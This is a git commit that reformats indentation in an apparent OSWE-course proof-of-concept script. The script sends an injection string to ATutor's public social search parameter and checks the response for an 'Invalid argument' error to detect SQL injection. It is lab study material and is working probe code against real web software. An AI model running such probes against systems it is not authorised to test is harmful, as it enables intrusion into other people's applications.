ab34419e0adda1ef5dfb11c6b258d2dfa66b53d7
NULL <68764921+debiantano@users.noreply.github.com>
2022-04-03 20:09:34 -0500

    Update poc1.py

--- OSWE/3_ATutor_Authentication_Bypass_and_RCE/poc1.py
+++ OSWE/3_ATutor_Authentication_Bypass_and_RCE/poc1.py
@@ -1,39 +1,36 @@
-import sys 
-import re 
+import sys
+import re
 import requests
-from bs4 import BeautifulSoup 
+from bs4 import BeautifulSoup
 
 def searchFriends_sqli(ip, inj_str):
-  target = "http://%s/atutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str) 
-  r = requests.get(target)
-  s = BeautifulSoup(r.text, 'lxml') 
-  
-  print "Response Headers:" 
-  print r.headers
-  
-  print "Response Content:" 
-  print s.text
-  
-  error = re.search("Invalid argument", s.text)
-  
-  if error: 
-    print "Errors found in response. Possible SQL injection found" 
-  else: 
-    print "No errors found" 
+	target = "http://%s/atutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
+	r = requests.get(target)
+	s = BeautifulSoup(r.text, 'lxml')
 
-def main(): 
-  if len(sys.argv) != 3: 
-  print "(+) usage: %s <target> <injection_string>" % sys.argv[0] 
-  print '(+) eg: %s 192.168.121.103 "aaaa\'" ' % sys.argv[0]   
-  sys.exit(-1)
-  
-  ip = sys.argv[1] 
-  injection_string = sys.argv[2] 
+	print "Response Headers:"
+	print r.headers
 
-  searchFriends_sqli(ip, injection_string) 
+	print "Response Content:"
+	print s.text
+
+	error = re.search("Invalid argument", s.text)
+
+	if error:
+		print "Errors found in response. Possible SQL injection found"
+	else:
+		print "No errors found"
+
+def main():
+	if len(sys.argv) != 3:
+		print "(+) usage: %s <target> <injection_string>" % sys.argv[0]
+		print '(+) eg: %s 192.168.121.103 "aaaa\'" ' % sys.argv[0]
+		sys.exit(-1)
+
+	ip = sys.argv[1]
+	injection_string = sys.argv[2]
+
+	searchFriends_sqli(ip, injection_string)
 
 if __name__ == "__main__":
-  main() 
-  
-  
- 
+	main()
